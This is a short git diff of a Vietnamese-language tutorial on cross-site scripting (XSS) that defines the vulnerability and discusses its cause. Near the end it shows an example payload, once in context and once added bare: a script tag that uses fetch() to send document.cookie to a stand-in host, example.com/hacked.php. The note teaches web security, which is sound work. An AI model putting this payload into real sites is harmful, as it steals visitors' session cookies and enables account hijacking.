@@ -1,5 +1,6 @@
 #XSS
 XSS
+![image](https://user-images.githubusercontent.com/54978467/134615358-41820711-e2dc-4506-9f6a-d4537bd74352.png)
 
 1. Cross-site scripting XSS là gì?
 Cross-site scripting (a.k.a XSS) là một lỗ hổng bảo mật web phổ biến và dễ bị tấn công nhất cho phép kẻ tấn công thực thi script trên Client.
@@ -31,3 +32,5 @@ Tấn công XSS là gửi và chèn script độc hại, những mã độc này
 
 a. Nguyên nhân
 [<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>]
+
+<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>
